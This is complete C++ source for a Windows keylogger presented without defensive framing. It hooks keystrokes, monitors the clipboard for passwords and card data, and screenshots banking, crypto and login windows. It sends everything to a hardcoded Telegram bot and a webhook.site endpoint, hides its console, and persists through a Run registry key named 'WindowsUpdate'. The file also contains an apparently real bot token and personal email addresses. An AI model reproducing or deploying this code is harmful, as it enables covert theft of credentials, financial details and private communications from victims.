// ========== SMART KEYLOGGER WITH INTELLIGENT SCREENSHOTS ==========
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <shlobj.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <queue>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

// ========== CONFIGURATION ==========
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// Webhook for Email
const wchar_t* WEBHOOK_ID = L"2e5cdc19-7f03-4359-a2f4-fb7e4b2fba8d";
const wchar_t* EMAIL_FROM = L"jesko200233@zohomail.com";
const wchar_t* EMAIL_TO = L"josephogidiagba49@gmail.com";

// Smart Screenshot Settings
const int MIN_SCREENSHOT_INTERVAL = 30; // Minimum 30 seconds between screenshots
const int MAX_SCREENSHOTS_PER_HOUR = 20;
const int KEYSTROKE_BURST_THRESHOLD = 50;

// ========== GLOBALS ==========
std::wstring keyBuffer, clipBuffer;
std::vector<BYTE> screenshotBuffer;
CRITICAL_SECTION keyLock, clipLock, screenshotLock, activityLock;
HHOOK keyboardHook = NULL;
bool running = true;
std::wstring systemID, computerName, userName, macAddress, windowsVersion;

// ========== SMART ACTIVITY TRACKING ==========
struct ActivityTracker {
    ULONGLONG lastKeystrokeTime = 0;
    int keystrokeCount = 0;
    std::wstring lastWindowTitle;
    ULONGLONG lastScreenshotTime = 0;
    int screenshotCounter = 0;
};

ActivityTracker activityTracker;

// High-value windows
const std::vector<std::wstring> HIGH_VALUE_WINDOWS = {
    L"login", L"sign in", L"password", L"bank", L"paypal", L"credit card",
    L"bitcoin", L"crypto", L"email", L"gmail", L"outlook", L"yahoo",
    L"facebook", L"whatsapp", L"telegram", L"discord", L"skype",
    L"administrator", L"control panel", L"settings", L"cmd.exe",
    L"powershell", L"command prompt", L"task manager", L"regedit"
};

// ========== UTILITY FUNCTIONS ==========
std::string url_encode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (unsigned char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else if (c == ' ') {
            escaped << '+';
        } else {
            escaped << '%' << std::setw(2) << static_cast<int>(c);
        }
    }
    return escaped.str();
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string str(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size, NULL, NULL);
    str.pop_back();
    return str;
}

// Helper function to convert string to wstring
std::wstring string_to_wstring(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size);
    wstr.pop_back();
    return wstr;
}

// ========== TELEGRAM FUNCTION ==========
void send_telegram(const std::wstring& message) {
    std::thread([message]() {
        HINTERNET hSession = WinHttpOpen(L"SmartKeylogger/1.0", 
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                       WINHTTP_NO_PROXY_NAME, 
                                       WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return;
        
        std::string utf8_msg = wstring_to_utf8(message);
        if (utf8_msg.size() > 3900) {
            utf8_msg = utf8_msg.substr(0, 3900) + "...";
        }
        
        std::string encoded = url_encode(utf8_msg);
        std::string path = "/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage?chat_id=7845441585&text=" + encoded;
        
        // Convert to wide string
        std::wstring wpath = string_to_wstring(path);
        
        HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", 443, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return;
        }
        
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
                                               NULL, WINHTTP_NO_REFERER,
                                               WINHTTP_DEFAULT_ACCEPT_TYPES,
                                               WINHTTP_FLAG_SECURE);
        if (hRequest) {
            WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }).detach();
}

// ========== EMAIL FUNCTION ==========
void send_email(const std::wstring& subject, const std::wstring& body) {
    std::thread([subject, body]() {
        HINTERNET hSession = WinHttpOpen(L"SmartKeyloggerEmail/1.0",
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                       WINHTTP_NO_PROXY_NAME,
                                       WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return;
        
        HINTERNET hConnect = WinHttpConnect(hSession, L"webhook.site", 443, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return;
        }
        
        // Prepare data
        std::string utf8_subject = wstring_to_utf8(subject);
        std::string utf8_body = wstring_to_utf8(body);
        
        std::string data = "subject=" + url_encode(utf8_subject) + 
                          "&body=" + url_encode(utf8_body) +
                          "&from=" + wstring_to_utf8(EMAIL_FROM) +
                          "&to=" + wstring_to_utf8(EMAIL_TO) +
                          "&computer=" + wstring_to_utf8(computerName) +
                          "&user=" + wstring_to_utf8(userName);
        
        std::wstring path = L"/" + std::wstring(WEBHOOK_ID);
        
        // FIXED: Convert headers to wide string
        std::wstring wheaders = L"Content-Type: application/x-www-form-urlencoded";
        
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                               NULL, WINHTTP_NO_REFERER,
                                               WINHTTP_DEFAULT_ACCEPT_TYPES,
                                               WINHTTP_FLAG_SECURE);
        if (hRequest) {
            // Convert data to wide string
            std::wstring wdata = string_to_wstring(data);
            WinHttpSendRequest(hRequest, wheaders.c_str(), wheaders.length(),
                              (LPVOID)wdata.c_str(),
                              wdata.length() * sizeof(wchar_t),
                              wdata.length() * sizeof(wchar_t), 0);
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }).detach();
}

// ========== DUAL DELIVERY ==========
void deliver_log(const std::wstring& log_type, const std::wstring& content, bool is_sensitive = false) {
    std::wstring timestamp = std::to_wstring(GetTickCount64());
    std::wstring full_message = L"[" + log_type + L"] " + timestamp + L"\n";
    if (is_sensitive) full_message += L"🔴 SENSITIVE\n";
    full_message += L"👤 " + userName + L" @ " + computerName + L"\n";
    full_message += content;
    
    send_telegram(full_message);
    
    std::wstring email_subject = L"Keylogger: " + log_type;
    if (is_sensitive) email_subject = L"🔴 " + email_subject;
    send_email(email_subject, full_message);
}

// ========== SMART SCREENSHOT SYSTEM ==========
std::wstring get_active_window_title() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        wchar_t title[256];
        GetWindowTextW(hwnd, title, 256);
        return std::wstring(title);
    }
    return L"";
}

bool is_high_value_window(const std::wstring& window_title) {
    if (window_title.empty()) return false;
    
    std::wstring lower_title = window_title;
    std::transform(lower_title.begin(), lower_title.end(), lower_title.begin(), ::towlower);
    
    for (const auto& keyword : HIGH_VALUE_WINDOWS) {
        if (lower_title.find(keyword) != std::wstring::npos) {
            return true;
        }
    }
    
    return false;
}

bool should_capture_screenshot() {
    ULONGLONG current_time = GetTickCount64();
    
    EnterCriticalSection(&activityLock);
    
    if (activityTracker.screenshotCounter >= MAX_SCREENSHOTS_PER_HOUR) {
        LeaveCriticalSection(&activityLock);
        return false;
    }
    
    if (current_time - activityTracker.lastScreenshotTime < MIN_SCREENSHOT_INTERVAL * 1000) {
        LeaveCriticalSection(&activityLock);
        return false;
    }
    
    // Check if user is active
    LASTINPUTINFO lastInput;
    lastInput.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lastInput)) {
        DWORD idle_time = (GetTickCount() - lastInput.dwTime) / 1000;
        if (idle_time > 300) {
            LeaveCriticalSection(&activityLock);
            return false;
        }
    }
    
    activityTracker.lastScreenshotTime = current_time;
    activityTracker.screenshotCounter++;
    
    static ULONGLONG last_reset_time = current_time;
    if (current_time - last_reset_time > 3600000) {
        activityTracker.screenshotCounter = 0;
        last_reset_time = current_time;
    }
    
    LeaveCriticalSection(&activityLock);
    return true;
}

bool capture_screenshot() {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // Reduced size for efficiency
    int captureWidth = screenWidth / 2;
    int captureHeight = screenHeight / 2;
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
    
    SetStretchBltMode(hdcMem, HALFTONE);
    StretchBlt(hdcMem, 0, 0, captureWidth, captureHeight, 
               hdcScreen, 0, 0, screenWidth, screenHeight, SRCCOPY);
    
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = captureWidth;
    bi.biHeight = captureHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    DWORD bitmapSize = ((captureWidth * 3 + 3) & ~3) * captureHeight;
    
    std::vector<BYTE> bitmapData(bitmapSize);
    GetDIBits(hdcMem, hBitmap, 0, captureHeight, bitmapData.data(), 
              (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    // Simple compression
    std::vector<BYTE> compressed;
    for (size_t i = 0; i < bitmapData.size(); i += 6) {
        if (i + 2 < bitmapData.size()) {
            compressed.push_back(bitmapData[i]);
            compressed.push_back(bitmapData[i + 1]);
            compressed.push_back(bitmapData[i + 2]);
        }
    }
    
    EnterCriticalSection(&screenshotLock);
    screenshotBuffer = compressed;
    LeaveCriticalSection(&screenshotLock);
    
    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    return !compressed.empty();
}

void smart_screenshot_monitor() {
    std::wstring last_window;
    
    while (running) {
        Sleep(5000);
        
        std::wstring current_window = get_active_window_title();
        
        if (!current_window.empty() && current_window != last_window) {
            last_window = current_window;
            
            if (is_high_value_window(current_window)) {
                if (should_capture_screenshot()) {
                    if (capture_screenshot()) {
                        EnterCriticalSection(&screenshotLock);
                        std::vector<BYTE> screenshot = screenshotBuffer;
                        LeaveCriticalSection(&screenshotLock);
                        
                        std::wstring message = L"📸 Smart Screenshot Captured\n";
                        message += L"🪟 Window: " + current_window + L"\n";
                        message += L"🔍 High-value target detected\n";
                        message += L"💾 Size: " + std::to_wstring(screenshot.size()) + L" bytes\n";
                        message += L"⏰ " + std::to_wstring(GetTickCount64());
                        
                        deliver_log(L"Smart Screenshot", message, true);
                    }
                }
            }
        }
        
        // Check for keystroke bursts
        ULONGLONG current_time = GetTickCount64();
        EnterCriticalSection(&activityLock);
        
        if (activityTracker.keystrokeCount > KEYSTROKE_BURST_THRESHOLD) {
            if (current_time - activityTracker.lastScreenshotTime > MIN_SCREENSHOT_INTERVAL * 1000) {
                if (capture_screenshot()) {
                    std::wstring active_window = get_active_window_title();
                    
                    std::wstring message = L"📸 Activity Screenshot\n";
                    message += L"💨 Rapid typing (" + std::to_wstring(activityTracker.keystrokeCount) + L" keystrokes)\n";
                    message += L"🪟 Window: " + active_window + L"\n";
                    message += L"⏰ " + std::to_wstring(GetTickCount64());
                    
                    deliver_log(L"Activity Screenshot", message, false);
                    
                    activityTracker.keystrokeCount = 0;
                }
            }
        }
        
        if (current_time - activityTracker.lastKeystrokeTime > 10000) {
            activityTracker.keystrokeCount = 0;
        }
        
        LeaveCriticalSection(&activityLock);
    }
}

// ========== KEYBOARD LOGGING ==========
void record_keystroke_activity() {
    ULONGLONG current_time = GetTickCount64();
    
    EnterCriticalSection(&activityLock);
    activityTracker.keystrokeCount++;
    activityTracker.lastKeystrokeTime = current_time;
    LeaveCriticalSection(&activityLock);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        
        record_keystroke_activity();
        
        EnterCriticalSection(&keyLock);
        
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        WCHAR buffer[16];
        int result = ToUnicode(pKey->vkCode, pKey->scanCode, 
                             keyboardState, buffer, 16, 0);
        
        if (result > 0) {
            keyBuffer += buffer[0];
            
            if (keyBuffer.length() >= 100) {
                std::wstring temp = keyBuffer;
                keyBuffer.clear();
                LeaveCriticalSection(&keyLock);
                
                deliver_log(L"⌨️ Keystrokes", temp);
                return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
            }
        }
        
        LeaveCriticalSection(&keyLock);
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

bool install_keyboard_hook() {
    keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    return keyboardHook != NULL;
}

// ========== CLIPBOARD MONITOR ==========
void clipboard_monitor() {
    std::wstring lastClipboard;
    
    while (running) {
        Sleep(1500);
        
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t* pszText = (wchar_t*)GlobalLock(hData);
                if (pszText) {
                    std::wstring currentClip(pszText);
                    if (!currentClip.empty() && currentClip != lastClipboard) {
                        lastClipboard = currentClip;
                        
                        bool is_sensitive = false;
                        std::wstring lowerClip = currentClip;
                        std::transform(lowerClip.begin(), lowerClip.end(), 
                                     lowerClip.begin(), ::towlower);
                        
                        if (lowerClip.find(L"password") != std::wstring::npos ||
                            lowerClip.find(L"@gmail.com") != std::wstring::npos ||
                            lowerClip.find(L"@yahoo.com") != std::wstring::npos ||
                            lowerClip.find(L"card") != std::wstring::npos ||
                            lowerClip.find(L"bank") != std::wstring::npos ||
                            lowerClip.find(L"login") != std::wstring::npos) {
                            is_sensitive = true;
                            
                            if (should_capture_screenshot()) {
                                std::thread([]() {
                                    if (capture_screenshot()) {
                                        std::wstring window = get_active_window_title();
                                        std::wstring message = L"📸 Screenshot for sensitive clipboard\n";
                                        message += L"🪟 Window: " + window + L"\n";
                                        message += L"⏰ " + std::to_wstring(GetTickCount64());
                                        deliver_log(L"Clipboard Screenshot", message, true);
                                    }
                                }).detach();
                            }
                        }
                        
                        deliver_log(L"📋 Clipboard", currentClip, is_sensitive);
                    }
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
    }
}

// ========== SYSTEM INFO ==========
std::wstring GetSystemIdentifier() {
    wchar_t username[256], compname[256];
    DWORD usernamelen = 256, compnamelen = 256;
    
    GetUserNameW(username, &usernamelen);
    GetComputerNameW(compname, &compnamelen);
    
    userName = username;
    computerName = compname;
    
    // MAC Address
    ULONG BufferLength = 0;
    GetAdaptersInfo(NULL, &BufferLength);
    PIP_ADAPTER_INFO pAdapter = (PIP_ADAPTER_INFO)malloc(BufferLength);
    GetAdaptersInfo(pAdapter, &BufferLength);
    
    if (pAdapter) {
        char mac[32];
        sprintf(mac, "%02X-%02X-%02X-%02X-%02X-%02X",
                pAdapter->Address[0], pAdapter->Address[1],
                pAdapter->Address[2], pAdapter->Address[3],
                pAdapter->Address[4], pAdapter->Address[5]);
        macAddress = std::wstring(mac, mac + strlen(mac));
    }
    free(pAdapter);
    
    // Windows Version
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    GetVersionExW((LPOSVERSIONINFOW)&osvi);
    windowsVersion = std::to_wstring(osvi.dwMajorVersion) + L"." + 
                    std::to_wstring(osvi.dwMinorVersion);
    
    std::wstring sid = L"SYS-" + computerName + L"-" + userName;
    systemID = sid;
    return sid;
}

// ========== PERSISTENCE ==========
void stealth_init() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

void persistence() {
    HKEY hKey;
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, 
                      (BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

// ========== MAIN FUNCTION ==========
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                  LPSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(GetModuleHandle(NULL));
    
    InitializeCriticalSection(&keyLock);
    InitializeCriticalSection(&clipLock);
    InitializeCriticalSection(&screenshotLock);
    InitializeCriticalSection(&activityLock);
    
    stealth_init();
    persistence();
    
    systemID = GetSystemIdentifier();
    
    std::wstring activationMsg = L"🚀 SMART KEYLOGGER ACTIVATED\n";
    activationMsg += L"🖥️ " + systemID + L"\n";
    activationMsg += L"👤 " + userName + L"\n";
    activationMsg += L"💻 " + computerName + L"\n";
    activationMsg += L"🔗 " + macAddress + L"\n";
    activationMsg += L"🪟 Windows " + windowsVersion + L"\n";
    activationMsg += L"📱 Telegram: Working\n";
    activationMsg += L"📧 Email: Ready\n";
    activationMsg += L"📸 Smart Screenshots: Enabled\n";
    activationMsg += L"⚡ Intelligence: Active\n";
    activationMsg += L"⏰ " + std::to_wstring(GetTickCount64());
    
    send_telegram(activationMsg);
    send_email(L"Smart Keylogger Activated", activationMsg);
    
    if (!install_keyboard_hook()) {
        return 1;
    }
    
    std::thread(clipboard_monitor).detach();
    std::thread(smart_screenshot_monitor).detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && running) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
    DeleteCriticalSection(&keyLock);
    DeleteCriticalSection(&clipLock);
    DeleteCriticalSection(&screenshotLock);
    DeleteCriticalSection(&activityLock);
    
    return 0;
}
